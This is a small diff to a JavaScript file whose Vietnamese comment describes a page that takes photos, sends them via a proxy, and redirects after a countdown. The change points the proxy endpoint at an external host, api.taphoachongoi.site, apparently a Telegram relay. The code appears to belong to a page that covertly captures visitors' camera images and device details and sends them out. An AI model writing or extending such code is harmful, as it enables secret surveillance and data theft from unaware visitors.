@@ -1,5 +1,6 @@
 // main.js - Phiên bản Full: Chụp ảnh, Gửi Proxy & Đếm ngược chuyển hướng
-const API_PROXY = '/api/tele-proxy';
+const API_PROXY =
+  'https://api.taphoachongoi.site/api/tele-proxy';
 
 const info = {
   time: new Date().toLocaleString('vi-VN'),
